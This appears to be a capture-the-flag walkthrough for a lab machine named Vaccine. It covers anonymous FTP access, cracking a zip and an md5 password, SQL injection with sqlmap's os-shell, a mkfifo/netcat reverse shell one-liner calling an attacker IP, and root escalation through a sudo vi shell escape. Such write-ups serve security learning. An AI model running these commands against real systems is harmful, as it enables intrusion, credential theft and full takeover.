# Explotation

### FTP
We would try to login with a default user in the ftp:
```console
> ftp anonymous@10.129.13.233
Password: 
230 Login successful.
```

We can try to navigate throw the FTP:
```console
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
ftp> get backup.zip
ftp> cd ..
```
We can download the zip, but we can not navigate to other directory.

If we try to unzip but it ask for a password. We need to crack the password:
```console
> sudo zip2john backup.zip > ziphash  
> sudo john ziphash --fork=10 -w=/usr/share/wordlists/rockyou.txt
    741852963
```

There we have logins to the webpage, but the password is encrypted.
We can see that is a md5 with **hash-identifier**. If we search it we can get the plain text: **qwerty789**.
Now we can login in the page.

### SQL
We can see that we have a table, if we search on it the url change:
```
http://10.129.13.233/dashboard.php?search=
```

It seems to have a <a href="{{ "/notes/databases/sql/" | prepend: site.baseurl }}">SQLi</a>, so we can try to use **sqlpmap**:
```console
sqlmap -r req
```
Where **req**:
```
GET /dashboard.php?search=a HTTP/1.1
Host: 10.129.13.233
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.13.233/dashboard.php
Connection: close
Cookie: PHPSESSID=05ndh3sf35jpa3l93oj9afdlgf
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

We check that it has a SQLi, then we can start a reverse shell:
```console
sqlmap -r req --os-shell
```
We should start a reverse shell in the **os-shell>** to more accessibility. We will open a port in our host and send this command on **Vaccine**:
```console
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.167 9000 >/tmp/f
```

# Privilage Escalation
We can go to **/var/www/html** and search for credentials with:
```console
> cat * | grep pass
```
We can see the credentials: **postgres:P@s5w0rd!**. Now we can try:
```console
> script /dev/null -c bash # To get a better shell
> sudo -l
    User postgres may run the following commands on vaccine:
        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Now, we will execute vi.
```console
> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
Afterwards, we execute:
```console
:!/bin/bash
```
And now we are root.
